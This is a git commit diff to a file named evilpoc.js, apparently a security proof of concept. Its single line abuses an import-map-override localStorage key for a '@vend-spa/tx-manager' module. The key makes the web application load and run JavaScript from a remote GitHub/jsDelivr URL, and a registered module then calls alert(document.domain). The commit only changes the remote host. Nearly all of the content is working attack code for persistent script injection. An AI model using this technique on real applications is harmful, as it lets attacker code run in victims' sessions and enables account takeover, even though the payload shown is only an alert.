289588224db961a2cf5e394c864d36a9113c4349
tester80 <85442500+ngostuan@users.noreply.github.com>
2026-05-21 10:08:33 -0700

    Update evilpoc.js

--- evilpoc.js
+++ evilpoc.js
@@ -1,2 +1,1 @@
-
-localStorage.setItem("import-map-override:@vend-spa/tx-manager","https://raw.githubusercontent.com/ngostuan/test/refs/heads/main/evilpoc.js");System.register([],function(e){return{execute:function(){alert(document.domain)}}});
+  localStorage.setItem("import-map-override:@vend-spa/tx-manager","https://cdn.jsdelivr.net/gh/ngostuan/test@main/evilpoc.js");System.register([],function(e){return{execute:function(){alert(document.domain)}}});
